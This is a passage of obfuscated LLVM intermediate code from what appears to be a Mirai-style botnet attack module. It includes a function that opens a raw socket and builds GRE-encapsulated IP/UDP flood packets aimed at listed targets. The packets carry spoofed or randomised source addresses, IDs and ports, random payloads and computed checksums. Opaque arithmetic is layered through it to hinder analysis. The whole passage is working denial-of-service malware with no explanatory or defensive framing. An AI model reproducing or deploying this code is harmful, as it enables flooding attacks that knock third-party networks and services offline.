  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 0, %79
  %83 = sub i64 0, %81
  %84 = add i64 %82, %83
  %85 = sub i64 0, %84
  %86 = add nsw i64 %79, %81
  %87 = trunc i64 %85 to i32
  store i32 %87, i32* %24, align 4
  %88 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %88, i32* %12, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %5
  br label %573

; <label>:91:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %92 = load i32, i32* %12, align 4
  %93 = bitcast i32* %11 to i8*
  %94 = call i32 @setsockopt(i32 %92, i32 0, i32 3, i8* %93, i32 4) #6
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %99

; <label>:96:                                     ; preds = %91
  %97 = load i32, i32* %12, align 4
  %98 = call i32 @close(i32 %97)
  br label %573

; <label>:99:                                     ; preds = %91
  store i32 0, i32* %11, align 4
  br label %100

; <label>:100:                                    ; preds = %331, %99
  %101 = load i32, i32* %11, align 4
  %102 = load i8, i8* %7, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  br i1 %104, label %105, label %337

; <label>:105:                                    ; preds = %100
  %106 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.grehdr*
  store %struct.grehdr* %119, %struct.grehdr** %26, align 8
  %120 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %121 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %120, i64 1
  %122 = bitcast %struct.grehdr* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %27, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i64 1
  %125 = bitcast %struct.iphdr* %124 to %struct.udphdr*
  store %struct.udphdr* %125, %struct.udphdr** %28, align 8
  %126 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %127 = bitcast %struct.iphdr* %126 to i8*
  %128 = load i8, i8* %127, align 4
  %129 = xor i8 15, -1
  %130 = xor i8 %128, %129
  %131 = and i8 %130, %128
  %132 = and i8 %128, 15
  %133 = xor i8 %131, -1
  %134 = xor i8 64, -1
  %135 = xor i8 -32, -1
  %136 = and i8 %133, -32
  %137 = and i8 %131, %135
  %138 = and i8 %134, -32
  %139 = and i8 64, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 -32, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 64
  store i8 %147, i8* %127, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = xor i8 -16, -1
  %153 = xor i8 %151, %152
  %154 = and i8 %153, %151
  %155 = and i8 %151, -16
  %156 = and i8 %154, 5
  %157 = xor i8 %154, 5
  %158 = or i8 %156, %157
  %159 = or i8 %154, 5
  store i8 %158, i8* %150, align 4
  %160 = load i8, i8* %14, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 1
  store i8 %160, i8* %162, align 1
  %163 = load i32, i32* %20, align 4
  %164 = sext i32 %163 to i64
  %165 = sub i64 52, -5976566198316716272
  %166 = add i64 %165, %164
  %167 = add i64 %166, -5976566198316716272
  %168 = add i64 52, %164
  %169 = trunc i64 %167 to i16
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 2
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %15, align 2
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 3
  store i16 %174, i16* %176, align 4
  %177 = load i8, i8* %16, align 1
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 5
  store i8 %177, i8* %179, align 4
  %180 = load i8, i8* %17, align 1
  %181 = icmp ne i8 %180, 0
  br i1 %181, label %182, label %186

; <label>:182:                                    ; preds = %105
  %183 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %184 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 4
  store i16 %183, i16* %185, align 2
  br label %186

; <label>:186:                                    ; preds = %182, %105
  %187 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 6
  store i8 47, i8* %188, align 1
  %189 = load i32, i32* %23, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 8
  store i32 %189, i32* %191, align 4
  %192 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 1
  %197 = load i32, i32* %196, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 9
  store i32 %197, i32* %199, align 4
  %200 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %201 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %202 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %201, i32 0, i32 1
  store i16 %200, i16* %202, align 2
  %203 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %204 = bitcast %struct.iphdr* %203 to i8*
  %205 = load i8, i8* %204, align 4
  %206 = xor i8 15, -1
  %207 = xor i8 %205, %206
  %208 = and i8 %207, %205
  %209 = and i8 %205, 15
  %210 = and i8 %208, 64
  %211 = xor i8 %208, 64
  %212 = or i8 %210, %211
  %213 = or i8 %208, 64
  store i8 %212, i8* %204, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %215 = bitcast %struct.iphdr* %214 to i8*
  %216 = load i8, i8* %215, align 4
  %217 = xor i8 -16, -1
  %218 = xor i8 %216, %217
  %219 = and i8 %218, %216
  %220 = and i8 %216, -16
  %221 = xor i8 %219, -1
  %222 = xor i8 5, -1
  %223 = xor i8 86, -1
  %224 = and i8 %221, 86
  %225 = and i8 %219, %223
  %226 = and i8 %222, 86
  %227 = and i8 5, %223
  %228 = or i8 %224, %225
  %229 = or i8 %226, %227
  %230 = xor i8 %228, %229
  %231 = or i8 %221, %222
  %232 = xor i8 %231, -1
  %233 = or i8 86, %223
  %234 = and i8 %232, %233
  %235 = or i8 %230, %234
  %236 = or i8 %219, 5
  store i8 %235, i8* %215, align 4
  %237 = load i8, i8* %14, align 1
  %238 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 1
  store i8 %237, i8* %239, align 1
  %240 = load i32, i32* %20, align 4
  %241 = sext i32 %240 to i64
  %242 = sub i64 28, 7983936161418541256
  %243 = add i64 %242, %241
  %244 = add i64 %243, 7983936161418541256
  %245 = add i64 28, %241
  %246 = trunc i64 %244 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #7
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  store i16 %247, i16* %249, align 2
  %250 = load i16, i16* %15, align 2
  %251 = zext i16 %250 to i32
  %252 = xor i32 %251, -1
  %253 = and i32 -1559181026, %252
  %254 = xor i32 -1559181026, -1
  %255 = and i32 %251, %254
  %256 = xor i32 -1, -1
  %257 = and i32 %256, -1559181026
  %258 = and i32 -1, %254
  %259 = or i32 %253, %255
  %260 = or i32 %257, %258
  %261 = xor i32 %259, %260
  %262 = xor i32 %251, -1
  %263 = trunc i32 %261 to i16
  %264 = call zeroext i16 @htons(i16 zeroext %263) #7
  %265 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 3
  store i16 %264, i16* %266, align 4
  %267 = load i8, i8* %16, align 1
  %268 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 5
  store i8 %267, i8* %269, align 4
  %270 = load i8, i8* %17, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %276

; <label>:272:                                    ; preds = %186
  %273 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %274 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 4
  store i16 %273, i16* %275, align 2
  br label %276

; <label>:276:                                    ; preds = %272, %186
  %277 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 6
  store i8 17, i8* %278, align 1
  %279 = call i32 @rand_next()
  %280 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 8
  store i32 %279, i32* %281, align 4
  %282 = load i8, i8* %22, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %290

; <label>:284:                                    ; preds = %276
  %285 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 9
  %287 = load i32, i32* %286, align 4
  %288 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 9
  store i32 %287, i32* %289, align 4
  br label %311

; <label>:290:                                    ; preds = %276
  %291 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 8
  %293 = load i32, i32* %292, align 4
  %294 = add i32 %293, 1665232167
  %295 = sub i32 %294, 1024
  %296 = sub i32 %295, 1665232167
  %297 = sub i32 %293, 1024
  %298 = xor i32 %296, -1
  %299 = and i32 1334991013, %298
  %300 = xor i32 1334991013, -1
  %301 = and i32 %296, %300
  %302 = xor i32 -1, -1
  %303 = and i32 %302, 1334991013
  %304 = and i32 -1, %300
  %305 = or i32 %299, %301
  %306 = or i32 %303, %304
  %307 = xor i32 %305, %306
  %308 = xor i32 %296, -1
  %309 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 9
  store i32 %307, i32* %310, align 4
  br label %311

; <label>:311:                                    ; preds = %290, %284
  %312 = load i16, i16* %18, align 2
  %313 = call zeroext i16 @htons(i16 zeroext %312) #7
  %314 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 0
  store i16 %313, i16* %315, align 2
  %316 = load i16, i16* %19, align 2
  %317 = call zeroext i16 @htons(i16 zeroext %316) #7
  %318 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 1
  store i16 %317, i16* %319, align 2
  %320 = load i32, i32* %20, align 4
  %321 = sext i32 %320 to i64
  %322 = sub i64 0, 8
  %323 = sub i64 0, %321
  %324 = add i64 %322, %323
  %325 = sub i64 0, %324
  %326 = add i64 8, %321
  %327 = trunc i64 %325 to i16
  %328 = call zeroext i16 @htons(i16 zeroext %327) #7
  %329 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i32 0, i32 2
  store i16 %328, i16* %330, align 2
  br label %331

; <label>:331:                                    ; preds = %311
  %332 = load i32, i32* %11, align 4
  %333 = sub i32 %332, 1340722828
  %334 = add i32 %333, 1
  %335 = add i32 %334, 1340722828
  %336 = add nsw i32 %332, 1
  store i32 %335, i32* %11, align 4
  br label %100

; <label>:337:                                    ; preds = %100
  br label %338

; <label>:338:                                    ; preds = %572, %337
  store i32 0, i32* %11, align 4
  br label %339

; <label>:339:                                    ; preds = %559, %338
  %340 = load i32, i32* %11, align 4
  %341 = load i8, i8* %7, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp slt i32 %340, %342
  br i1 %343, label %344, label %566

; <label>:344:                                    ; preds = %339
  %345 = load i8**, i8*** %13, align 8
  %346 = load i32, i32* %11, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds i8*, i8** %345, i64 %347
  %349 = load i8*, i8** %348, align 8
  store i8* %349, i8** %29, align 8
  %350 = load i8*, i8** %29, align 8
  %351 = bitcast i8* %350 to %struct.iphdr*
  store %struct.iphdr* %351, %struct.iphdr** %30, align 8
  %352 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i64 1
  %354 = bitcast %struct.iphdr* %353 to %struct.grehdr*
  store %struct.grehdr* %354, %struct.grehdr** %31, align 8
  %355 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %356 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %355, i64 1
  %357 = bitcast %struct.grehdr* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %32, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.udphdr*
  store %struct.udphdr* %360, %struct.udphdr** %33, align 8
  %361 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i64 1
  %363 = bitcast %struct.udphdr* %362 to i8*
  store i8* %363, i8** %34, align 8
  %364 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %365 = load i32, i32* %11, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 2
  %369 = load i8, i8* %368, align 4
  %370 = zext i8 %369 to i32
  %371 = icmp slt i32 %370, 32
  br i1 %371, label %372, label %395

; <label>:372:                                    ; preds = %344
  %373 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 1
  %378 = load i32, i32* %377, align 4
  %379 = call i32 @ntohl(i32 %378) #7
  %380 = call i32 @rand_next()
  %381 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = lshr i32 %380, %387
  %389 = sub i32 0, %388
  %390 = sub i32 %379, %389
  %391 = add i32 %379, %388
  %392 = call i32 @htonl(i32 %390) #7
  %393 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 9
  store i32 %392, i32* %394, align 4
  br label %395

; <label>:395:                                    ; preds = %372, %344
  %396 = load i32, i32* %23, align 4
  %397 = icmp eq i32 %396, -1
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %395
  %399 = call i32 @rand_next()
  %400 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 8
  store i32 %399, i32* %401, align 4
  br label %402

; <label>:402:                                    ; preds = %398, %395
  %403 = load i16, i16* %15, align 2
  %404 = zext i16 %403 to i32
  %405 = icmp eq i32 %404, 65535
  br i1 %405, label %406, label %432

; <label>:406:                                    ; preds = %402
  %407 = call i32 @rand_next()
  %408 = xor i32 65535, -1
  %409 = xor i32 %407, %408
  %410 = and i32 %409, %407
  %411 = and i32 %407, 65535
  %412 = trunc i32 %410 to i16
  %413 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 3
  store i16 %412, i16* %414, align 4
  %415 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 3
  %417 = load i16, i16* %416, align 4
  %418 = zext i16 %417 to i32
  %419 = sub i32 %418, -1503337543
  %420 = sub i32 %419, 1000
  %421 = add i32 %420, -1503337543
  %422 = sub nsw i32 %418, 1000
  %423 = xor i32 %421, -1
  %424 = and i32 -1, %423
  %425 = xor i32 -1, -1
  %426 = and i32 %421, %425
  %427 = or i32 %424, %426
  %428 = xor i32 %421, -1
  %429 = trunc i32 %427 to i16
  %430 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 3
  store i16 %429, i16* %431, align 4
  br label %432

; <label>:432:                                    ; preds = %406, %402
  %433 = load i16, i16* %18, align 2
  %434 = zext i16 %433 to i32
  %435 = icmp eq i32 %434, 65535
  br i1 %435, label %436, label %449

; <label>:436:                                    ; preds = %432
  %437 = call i32 @rand_next()
  %438 = xor i32 %437, -1
  %439 = xor i32 65535, -1
  %440 = xor i32 249503727, -1
  %441 = or i32 %438, %439
  %442 = or i32 249503727, %440
  %443 = xor i32 %441, -1
  %444 = and i32 %443, %442
  %445 = and i32 %437, 65535
  %446 = trunc i32 %444 to i16
  %447 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 0
  store i16 %446, i16* %448, align 2
  br label %449

; <label>:449:                                    ; preds = %436, %432
  %450 = load i16, i16* %19, align 2
  %451 = zext i16 %450 to i32
  %452 = icmp eq i32 %451, 65535
  br i1 %452, label %453, label %462

; <label>:453:                                    ; preds = %449
  %454 = call i32 @rand_next()
  %455 = xor i32 65535, -1
  %456 = xor i32 %454, %455
  %457 = and i32 %456, %454
  %458 = and i32 %454, 65535
  %459 = trunc i32 %457 to i16
  %460 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %461 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %460, i32 0, i32 1
  store i16 %459, i16* %461, align 2
  br label %462

; <label>:462:                                    ; preds = %453, %449
  %463 = load i8, i8* %22, align 1
  %464 = icmp ne i8 %463, 0
  br i1 %464, label %469, label %465

; <label>:465:                                    ; preds = %462
  %466 = call i32 @rand_next()
  %467 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 9
  store i32 %466, i32* %468, align 4
  br label %475

; <label>:469:                                    ; preds = %462
  %470 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 9
  %472 = load i32, i32* %471, align 4
  %473 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 9
  store i32 %472, i32* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %469, %465
  %476 = load i8, i8* %21, align 1
  %477 = icmp ne i8 %476, 0
  br i1 %477, label %478, label %485

; <label>:478:                                    ; preds = %475
  %479 = load i8*, i8** %34, align 8
  %480 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %479, i32 %480)
  %481 = load i8*, i8** %34, align 8
  %482 = load i32, i32* %20, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds i8, i8* %481, i64 %483
  store i8 0, i8* %484, align 1
  br label %485

; <label>:485:                                    ; preds = %478, %475
  %486 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 7
  store i16 0, i16* %487, align 2
  %488 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %489 = bitcast %struct.iphdr* %488 to i16*
  %490 = call zeroext i16 @checksum_generic(i16* %489, i32 20)
  %491 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %492 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %491, i32 0, i32 7
  store i16 %490, i16* %492, align 2
  %493 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 7
  store i16 0, i16* %494, align 2
  %495 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %496 = bitcast %struct.iphdr* %495 to i16*
  %497 = call zeroext i16 @checksum_generic(i16* %496, i32 20)
  %498 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 7
  store i16 %497, i16* %499, align 2
  %500 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 3
  store i16 0, i16* %501, align 2
  %502 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %503 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %504 = bitcast %struct.udphdr* %503 to i8*
  %505 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %506 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %505, i32 0, i32 2
  %507 = load i16, i16* %506, align 2
  %508 = load i32, i32* %20, align 4
  %509 = sext i32 %508 to i64
  %510 = sub i64 8, 5941847123303371591
  %511 = add i64 %510, %509
  %512 = add i64 %511, 5941847123303371591
  %513 = add i64 8, %509
  %514 = trunc i64 %512 to i32
  %515 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %502, i8* %504, i16 zeroext %507, i32 %514)
  %516 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %517 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %516, i32 0, i32 3
  store i16 %515, i16* %517, align 2
